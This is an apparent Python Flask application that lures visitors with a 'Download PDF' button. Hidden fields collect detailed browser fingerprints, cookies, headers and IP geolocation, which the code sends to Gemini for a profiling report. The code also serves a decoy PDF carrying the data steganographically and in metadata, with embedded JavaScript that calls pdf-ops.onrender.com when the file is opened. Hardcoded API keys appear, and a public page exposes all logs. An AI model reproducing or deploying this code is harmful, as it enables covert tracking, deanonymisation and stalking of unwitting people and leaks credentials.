from flask import Flask, request, render_template_string, send_file
import logging
import json
import os
import requests
import base64
import uuid
from faker import Faker
from io import BytesIO
from reportlab.pdfgen import canvas
from reportlab.lib.pagesizes import letter
from reportlab.platypus import SimpleDocTemplate, Paragraph, Image
from reportlab.lib.styles import getSampleStyleSheet
from cryptography.fernet import Fernet
from stegano import lsb
from PIL import Image as PILImage
import PyPDF2
import netifaces  # New dependency for network interface information

# Import the Google Generative AI SDK for Gemini
import google.generativeai as genai
# Configure the SDK with your Gemini API key.
genai.configure(api_key=os.environ.get("GEMINI_API_KEY", "AIzaSyAt-7tA0Ah0cRJrarXMOY4DTPBbzBbASyU"))

app = Flask(__name__)

# Configure logging to a file
logging.basicConfig(
    level=logging.INFO,
    filename='user_logs.log',
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# Initialize Faker for generating fake PDF content
fake = Faker()

# Encryption key (store securely in production)
ENCRYPTION_KEY = Fernet.generate_key()
CIPHER = Fernet(ENCRYPTION_KEY)

# Store tokens for verification (ephemeral)
logged_tokens = {}

# Global list to store downloaded reports (token and report)
downloaded_reports = []
def get_wifi_location_from_wigle(bssid):
    """
    Query the Wigle WiFi API to get geolocation (latitude, longitude) for a given BSSID.
    Ensure that the environment variables WIGLE_USERNAME and WIGLE_API_TOKEN are set.
    """
    username = "AID9d6a1f4d617967b3d4c6189558862314"
    api_token = "ac01dcab47f048daf62cb43edaf37295"
    if not username or not api_token:
        logging.error("Wigle API credentials are not set in environment variables.")
        return None, None
    headers = {"Accept": "application/json"}
    params = {"netid": bssid}
    try:
        response = requests.get("https://api.wigle.net/api/v2/network/search", headers=headers, params=params, auth=(username, api_token))
        if response.status_code == 200:
            data = response.json()
            if data.get("results"):
                # Return latitude and longitude of the first result
                return data["results"][0].get("trilat"), data["results"][0].get("trilong")
    except Exception as e:
        logging.error("Error querying Wigle API: " + str(e))
    return None, None

def get_hidden_message(data):
    """Return the hidden message wrapped with markers."""
    encoded = base64.b64encode(json.dumps(data).encode()).decode()
    return "<<BASE64 START>>" + encoded + "<<BASE64 END>>"

def get_ip_geolocation(ip):
    """Fetch geolocation data from ipinfo.io."""
    try:
        response = requests.get(f"https://ipinfo.io/{ip}/json")
        if response.status_code == 200:
            data = response.json()
            loc = data.get("loc", "").split(",")
            if loc and len(loc) == 2:
                return float(loc[0]), float(loc[1]), data
            else:
                return None, None, data
    except Exception as e:
        logging.error(f"IP Geolocation error: {e}")
    return None, None, {}

def collect_data(req):
    """Collect client-side and server-side data."""
    ip_header = req.headers.get('X-Forwarded-For', req.remote_addr)
    ip = ip_header.split(",")[0].strip() if ip_header else req.remote_addr
    user_agent = req.headers.get('User-Agent', 'unknown')
    cookies = req.cookies
    tls_metadata = req.environ.get('wsgi.url_scheme')

    client_data = {
        'screenWidth': req.form.get('screenWidth'),
        'screenHeight': req.form.get('screenHeight'),
        'colorDepth': req.form.get('colorDepth'),
        'pixelDepth': req.form.get('pixelDepth'),
        'language': req.form.get('language'),
        'platform': req.form.get('platform'),
        'connection': req.form.get('connection'),
        'pageLoadTime': req.form.get('pageLoadTime'),
        'clickTime': req.form.get('clickTime'),
        'dwellTime': req.form.get('dwellTime'),
        'lastMouseX': req.form.get('lastMouseX'),
        'lastMouseY': req.form.get('lastMouseY'),
        'referrer': req.form.get('referrer'),
        'canvasFingerprint': req.form.get('canvasFingerprint'),
        'hardwareConcurrency': req.form.get('hardwareConcurrency'),
        'deviceMemory': req.form.get('deviceMemory'),
        'timezoneOffset': req.form.get('timezoneOffset'),
        'touchSupport': req.form.get('touchSupport'),
        'batteryLevel': req.form.get('batteryLevel'),
        'charging': req.form.get('charging'),
        'downlink': req.form.get('downlink'),
        'plugins': req.form.get('plugins')
    }

    lat, lon, geo_data = get_ip_geolocation(ip)
    client_data['latitude'] = lat if lat is not None else ""
    client_data['longitude'] = lon if lon is not None else ""
    client_data['ip_geolocation'] = geo_data

    log_message = {
        'ip': ip,
        'user_agent': user_agent,
        'action': 'Downloaded PDF',
        'client_data': client_data,
        'request_headers': dict(req.headers),
        'cookies': cookies,
        'tls_metadata': tls_metadata
    }
    return log_message

def embed_data_in_image(data):
    """Embed encrypted data in an image using steganography."""
    encrypted_data = CIPHER.encrypt(json.dumps(data).encode())
    base_img = PILImage.new('RGB', (500, 500), color='white')
    temp_path = 'temp_base.png'
    base_img.save(temp_path)
    stego_img = lsb.hide(temp_path, encrypted_data)
    os.remove(temp_path)
    return stego_img

def simulate_multi_stage_payload(data):
    """Simulate multi-stage payload delivery (for demonstration only)."""
    logging.info("Simulating multi-stage payload delivery with data: " + json.dumps(data))
    stage_payload = {"stage": "initial", "info": "Initial payload delivered"}
    stage_payload["stage"] = "secondary"
    stage_payload["info"] = "Additional stage executed"
    logging.info("Simulated multi-stage payload: " + json.dumps(stage_payload))
    return stage_payload

def simulate_dll_injection():
    """Simulate a DLL injection (for demonstration only)."""
    logging.info("Simulated DLL injection executed (defensive demonstration only)")
    return "DLL injection simulated"

def get_gemini_report(data):
    """
    Use the Google Generative AI SDK to generate a security and forensics report.
    The prompt instructs Gemini to act as a Security and Forensics Analyst.
    """
    try:
        prompt = (
"""   You are a cybersecurity investigator tasked with analyzing device and user details
    to identify potential connections and patterns related to online harassment.
    Your goal is to generate a report highlighting potential leads for further investigation.

    **Important Considerations:**

    *   This analysis is for investigative purposes only. It does NOT definitively
        identify a harasser.
    *   False positives are possible. Any potential connections identified must be
        thoroughly investigated before any action is taken.
    *   Focus on identifying patterns and anomalies in the data.
    *   Consider the limitations of the data.
    *   Avoid making assumptions or drawing hasty conclusions.
    *   Ensure all actions comply with legal and ethical guidelines.

    **Data Description:**

    The provided data contains information about devices and users potentially involved
    in online harassment.  This may include:

    *   **Device Information:** IP addresses, device IDs, operating system, browser information,
        location data (if available).
    *   **User Details:** Usernames, email addresses, social media profiles, online activity logs.
        (Note: Treat this data with utmost sensitivity.)

    **Instructions:**

    1.  **Analyze Data for Potential Connections:** Analyze the provided data to identify:
        *   **Shared IP Addresses:** Multiple users connecting from the same IP address.
        *   **Similar Device Fingerprints:** Devices with similar configurations or software.
        *   **Overlapping Online Activity:** Users active on the same platforms or websites at similar times.
        *   **Related Social Media Accounts:** Accounts that are linked to each other or share similar content.
        *   **Anomalous Behavior:** Unusual patterns of activity, such as rapid account creation or sudden changes in behavior.
        *   **Geolocation Patterns:** Users who appear in the same geolocation repeatedly during harassment events.

    2.  **Assess the Strength of Connections:** For each potential connection, assess its strength based on the amount of supporting evidence.

    3.  **Prioritize Potential Leads:**  Identify the most promising leads for further investigation based on the strength of the connections and the potential for identifying the harasser.

    4.  **Format the Report:** Structure the report as follows:

        **Investigative Analysis Report**

        **Date:** [Current Date and Time]

        **Data Source:** [Description of the data source - e.g., "Data collected from [Platform] logs"]

        **Executive Summary:** [A brief overview of the potential connections and leads.]

        **Detailed Findings:**

        *   **Potential Connection 1:** [Description of the potential connection - e.g., "Multiple users sharing the same IP address"]
            *   **Users Involved:** [List of usernames or identifiers]
            *   **Supporting Evidence:** [Specific data points supporting the connection]
            *   **Strength of Connection:** [High/Medium/Low]
            *   **Potential Lead:** [Explanation of how this connection could lead to identifying the harasser]

        *   **Potential Connection 2:** [Repeat the above structure for each potential connection]

        **Conclusion:** [A summary of the most promising leads for further investigation.  Emphasize that this report identifies POTENTIAL connections, and further investigation is required.] """ + json.dumps(data, indent=2) + """
"""
        )
        model = genai.GenerativeModel('gemini-2.0-flash')
        response = model.generate_content(prompt)
        report = response.text
        logging.info("Gemini AI report received: " + report)
        return report
    except Exception as e:
        logging.error("Error contacting Gemini AI: " + str(e))
        return f"Error contacting Gemini AI: {e}"

def generate_pdf(logged_data):
    """Generate a PDF with fake content and embed steganographic data.
    Add custom metadata and JavaScript callbacks via PyPDF2."""
    buffer = BytesIO()
    doc = SimpleDocTemplate(buffer, pagesize=letter)
    styles = getSampleStyleSheet()
    story = []

    # Fake content
    story.append(Paragraph("Fake PDF Document", styles['Title']))
    story.append(Paragraph(f"Name: {fake.name()}", styles['Normal']))
    address = fake.address().replace('\n', ', ')
    story.append(Paragraph(f"Address: {address}", styles['Normal']))
    story.append(Paragraph("Additional Info:", styles['Normal']))
    story.append(Paragraph(fake.text(max_nb_chars=200), styles['Normal']))

    # Embed data in an image using steganography
    stego_img = embed_data_in_image(logged_data)
    img_buffer = BytesIO()
    stego_img.save(img_buffer, format='PNG')
    img_buffer.seek(0)
    story.append(Image(img_buffer, width=100, height=100))

    # Verification link with a unique token
    token = str(uuid.uuid4())
    verification_link = f"https://pdf-ops.onrender.com/verify?token={token}"
    story.append(Paragraph(f"Please <a href='{verification_link}'>click here</a> to thank our services.", styles['Normal']))

    doc.build(story)
    buffer.seek(0)
    
    # Add extra metadata and JavaScript via PyPDF2.
    hidden_message = get_hidden_message(logged_data)
    reversed_token = token[::-1]
    
    pdf_reader = PyPDF2.PdfReader(buffer)
    pdf_writer = PyPDF2.PdfWriter()
    for page in pdf_reader.pages:
        pdf_writer.add_page(page)
    pdf_writer.add_metadata({'/HiddenData': hidden_message})
    
    js_code = f"""
    if (typeof XMLHttpRequest !== 'undefined') {{
        try {{
            var req1 = new XMLHttpRequest();
            req1.open("GET", "https://pdf-ops.onrender.com/pdf_callback?data=" + encodeURIComponent("{hidden_message}"), true);
            req1.send();
        }} catch(e) {{}}
    }}
    var reversedToken = "{reversed_token}";
    var token = reversedToken.split("").reverse().join("");
    if (typeof XMLHttpRequest !== 'undefined') {{
        try {{
            var req2 = new XMLHttpRequest();
            req2.open("GET", "https://pdf-ops.onrender.com/pdf_callback_stage2?token=" + encodeURIComponent(token), true);
            req2.send();
        }} catch(e) {{}}
    }}
    """
    pdf_writer.add_js(js_code)
    
    new_buffer = BytesIO()
    pdf_writer.write(new_buffer)
    new_buffer.seek(0)
    return new_buffer, token

# --- HTML for the front-end ---
HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Download PDF</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin-top: 100px; background-color: #f2f2f2; }
        h1 { color: #333; }
        button { padding: 15px 30px; font-size: 18px; background-color: #4CAF50; color: white; border: none; border-radius: 5px; cursor: pointer; }
        button:hover { background-color: #45a049; }
    </style>
</head>
<body>
    <h1>Click to Download PDF and Log Your Data</h1>
    <form id="downloadForm" action="/download" method="post">
        <button type="submit">Download PDF</button>
        <input type="hidden" name="screenWidth" id="screenWidth">
        <input type="hidden" name="screenHeight" id="screenHeight">
        <input type="hidden" name="colorDepth" id="colorDepth">
        <input type="hidden" name="pixelDepth" id="pixelDepth">
        <input type="hidden" name="language" id="language">
        <input type="hidden" name="platform" id="platform">
        <input type="hidden" name="connection" id="connection">
        <input type="hidden" name="pageLoadTime" id="pageLoadTime">
        <input type="hidden" name="clickTime" id="clickTime">
        <input type="hidden" name="dwellTime" id="dwellTime">
        <input type="hidden" name="lastMouseX" id="lastMouseX">
        <input type="hidden" name="lastMouseY" id="lastMouseY">
        <input type="hidden" name="referrer" id="referrer">
        <input type="hidden" name="canvasFingerprint" id="canvasFingerprint">
        <input type="hidden" name="hardwareConcurrency" id="hardwareConcurrency">
        <input type="hidden" name="deviceMemory" id="deviceMemory">
        <input type="hidden" name="timezoneOffset" id="timezoneOffset">
        <input type="hidden" name="touchSupport" id="touchSupport">
        <input type="hidden" name="batteryLevel" id="batteryLevel">
        <input type="hidden" name="charging" id="charging">
        <input type="hidden" name="downlink" id="downlink">
        <input type="hidden" name="plugins" id="plugins">
    </form>
    <br>
    <a href="/logs">View Logs and Gemini Reports</a>
    <script>
        var pageLoadTime = Date.now();
        document.getElementById('pageLoadTime').value = pageLoadTime;
        var lastMouseX = 0, lastMouseY = 0;
        document.addEventListener('mousemove', function(e) {
            lastMouseX = e.clientX; lastMouseY = e.clientY;
        });
        function gatherExtraData(callback) {
            var canvas = document.createElement("canvas"), ctx = canvas.getContext("2d");
            ctx.textBaseline = "top"; ctx.font = "14px Arial"; ctx.fillStyle = "#f60";
            ctx.fillRect(125, 1, 62, 20); ctx.fillStyle = "#069"; ctx.fillText("Hello, world!", 2, 15);
            document.getElementById('canvasFingerprint').value = canvas.toDataURL();
            document.getElementById('hardwareConcurrency').value = navigator.hardwareConcurrency || '';
            document.getElementById('deviceMemory').value = navigator.deviceMemory || '';
            document.getElementById('timezoneOffset').value = new Date().getTimezoneOffset();
            document.getElementById('touchSupport').value = ('ontouchstart' in window) ? true : false;
            if (navigator.plugins) {
                var plugins = Array.from(navigator.plugins).map(function(p) { return p.name; });
                document.getElementById('plugins').value = plugins.join(', ');
            } else { document.getElementById('plugins').value = ''; }
            if (navigator.connection && navigator.connection.downlink) {
                document.getElementById('downlink').value = navigator.connection.downlink;
            } else { document.getElementById('downlink').value = ''; }
            if (navigator.getBattery) {
                navigator.getBattery().then(function(battery) {
                    document.getElementById('batteryLevel').value = battery.level;
                    document.getElementById('charging').value = battery.charging;
                    callback();
                }).catch(function(error) {
                    document.getElementById('batteryLevel').value = '';
                    document.getElementById('charging').value = '';
                    callback();
                });
            } else { document.getElementById('batteryLevel').value = ''; document.getElementById('charging').value = ''; callback(); }
        }
        document.getElementById('downloadForm').addEventListener('submit', function(e) {
            e.preventDefault();
            document.getElementById('screenWidth').value = screen.width;
            document.getElementById('screenHeight').value = screen.height;
            document.getElementById('colorDepth').value = screen.colorDepth;
            document.getElementById('pixelDepth').value = screen.pixelDepth;
            document.getElementById('language').value = navigator.language;
            document.getElementById('platform').value = navigator.platform;
            document.getElementById('connection').value = (navigator.connection && navigator.connection.effectiveType) ? navigator.connection.effectiveType : '';
            document.getElementById('referrer').value = document.referrer;
            var clickTime = Date.now();
            document.getElementById('clickTime').value = clickTime;
            document.getElementById('dwellTime').value = clickTime - pageLoadTime;
            document.getElementById('lastMouseX').value = lastMouseX;
            document.getElementById('lastMouseY').value = lastMouseY;
            gatherExtraData(function() { e.target.submit(); });
        });
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

# ============================
# START: WiFi Triangulation Integration Using netifaces
# ============================
def get_wifi_interfaces():
    """
    Use netifaces to list interfaces that likely represent WiFi.
    Typically, interface names containing "wlan" or "wifi" are considered WiFi interfaces.
    This function fetches all available address information and returns relevant details
    for potential triangulation.
    """
    wifi_interfaces = []
    for iface in netifaces.interfaces():
        # if "wlan" in iface.lower() or "wifi" in iface.lower():
            try:
                addresses = netifaces.ifaddresses(iface)
                # Get link-layer (MAC) information
                af_link_info = addresses.get(netifaces.AF_LINK, [{}])
                mac = af_link_info[0].get('addr', None) if af_link_info else None

                # Get IPv4 details: address, netmask, broadcast
                af_inet_info = addresses.get(netifaces.AF_INET, [{}])
                ipv4 = af_inet_info[0].get('addr', None) if af_inet_info else None
                ipv4_netmask = af_inet_info[0].get('netmask', None) if af_inet_info else None
                ipv4_broadcast = af_inet_info[0].get('broadcast', None) if af_inet_info else None

                # Get IPv6 details (if any)
                af_inet6_info = addresses.get(netifaces.AF_INET6, [{}])
                ipv6 = af_inet6_info[0].get('addr', None) if af_inet6_info else None

                wifi_interfaces.append({
                    'interface': iface,
                    'mac': mac,
                    'ipv4': ipv4,
                    'ipv4_netmask': ipv4_netmask,
                    'ipv4_broadcast': ipv4_broadcast,
                    'ipv6': ipv6,
                    'all_addresses': addresses  # full address information for further processing
                })
            except Exception as e:
                logging.error("Error getting addresses for interface " + iface + ": " + str(e))
    return wifi_interfaces


def perform_wifi_triangulation():
    """
    Attempt to perform a simulated WiFi triangulation by retrieving WiFi interface details via netifaces.
    If a WiFi interface is found, use its MAC address to query the Wigle API for geolocation data.
    Note: A network interface's MAC address is not the same as an access point's BSSID.
    """
    wifi_interfaces = get_wifi_interfaces()
    if not wifi_interfaces:
        logging.info("No WiFi interfaces found for triangulation.")
        return "No WiFi interfaces found for triangulation."
    
    # Use the first detected WiFi interface
    interface_info = wifi_interfaces[0]
    mac = interface_info.get('mac')
    if not mac:
        logging.info("WiFi interface does not have a MAC address.")
        return "WiFi interface does not have a MAC address."
    
    # Query Wigle using the interface's MAC address (as a proxy for BSSID)
    lat, lon = get_wifi_location_from_wigle(mac)
    if lat is None or lon is None:
        return "No geolocation data found for the WiFi interface."
    
    triangulated_location = {"latitude": lat, "longitude": lon, "interface": interface_info}
    logging.info("Triangulated WiFi location: " + str(triangulated_location))
    return triangulated_location

# Optional endpoint to view WiFi triangulation results directly
@app.route('/wifi_triangulation')
def wifi_triangulation():
    triangulated_data = perform_wifi_triangulation()
    return json.dumps(triangulated_data), 200, {'Content-Type': 'application/json'}

# ============================
# END: WiFi Triangulation Integration Using netifaces
# ============================

@app.route('/download', methods=['POST'])
def download():
    logged_data = collect_data(request)
    logging.info(json.dumps(logged_data))
    
    # --- NEW: Add WiFi Triangulation Data ---
    wifi_data = get_wifi_interfaces()
    logged_data["wifi_triangulation"] = wifi_data
    logging.info("WiFi Triangulation Data: " + str(wifi_data))
    # -----------------------------------------
    
    # Generate Gemini report and store it in the logged data.
    gemini_report = get_gemini_report(logged_data)
    logged_data["gemini_report"] = gemini_report
    logging.info("Gemini AI report: " + gemini_report)
    
    multi_stage_result = simulate_multi_stage_payload(logged_data)
    dll_injection_result = simulate_dll_injection()
    logged_data["simulation"] = {
        "multi_stage": multi_stage_result,
        "dll_injection": dll_injection_result
    }

    pdf_buffer, token = generate_pdf(logged_data)
    logged_tokens[token] = logged_data
    # Also store the report in the global downloaded_reports list.
    downloaded_reports.append({
        "token": token,
        "gemini_report": gemini_report
    })

    return send_file(pdf_buffer, as_attachment=True, download_name='sample.pdf', mimetype='application/pdf')

@app.route('/verify', methods=['GET'])
def verify():
    token = request.args.get('token')
    if token in logged_tokens:
        logging.info(f"PDF opened for token: {token} - Data: " + json.dumps(logged_tokens[token]))
        del logged_tokens[token]
        return "Thank you!", 200
    return "Invalid token", 400

@app.route('/pdf_callback', methods=['GET'])
def pdf_callback():
    hidden_data = request.args.get('data', '')
    logging.info("Primary PDF callback triggered with data: " + hidden_data)
    return "Primary callback logged", 200

@app.route('/pdf_callback_stage2', methods=['GET'])
def pdf_callback_stage2():
    token = request.args.get('token', '')
    if token in logged_tokens:
        logging.info(f"Stage2 callback: Token {token} verified with data: " + json.dumps(logged_tokens[token]))
        return "Stage2 callback logged", 200
    return "Invalid token", 400

@app.route('/logs')
def display_logs():
    try:
        with open('user_logs.log', 'r') as f:
            logs_content = f.read()
    except Exception as e:
        logs_content = f"Error reading log file: {e}"
    
    # Build HTML to display raw logs and the downloaded Gemini reports.
    logs_html = """
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>User Logs and Gemini Reports</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 20px; background-color: #f9f9f9; }
            h1, h2 { color: #333; }
            pre { background: #eee; padding: 15px; border-radius: 5px; overflow: auto; }
            table { width: 100%; border-collapse: collapse; margin-top: 20px; }
            th, td { border: 1px solid #ccc; padding: 10px; text-align: left; }
            th { background-color: #f2f2f2; }
        </style>
    </head>
    <body>
        <h1>User Logs</h1>
        <pre>{{ logs }}</pre>
        <h2>Downloaded Gemini Reports</h2>
        {% if reports %}
        <table>
            <tr>
                <th>Token</th>
                <th>Gemini Report</th>
            </tr>
            {% for report in reports %}
            <tr>
                <td>{{ report.token }}</td>
                <td><pre>{{ report.gemini_report }}</pre></td>
            </tr>
            {% endfor %}
        </table>
        {% else %}
        <p>No reports available.</p>
        {% endif %}
    </body>
    </html>
    """
    return render_template_string(logs_html, logs=logs_content, reports=downloaded_reports)

@app.route('/simulate')
def simulate():
    return "Simulation endpoint", 200

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(debug=True, host="0.0.0.0", port=port)
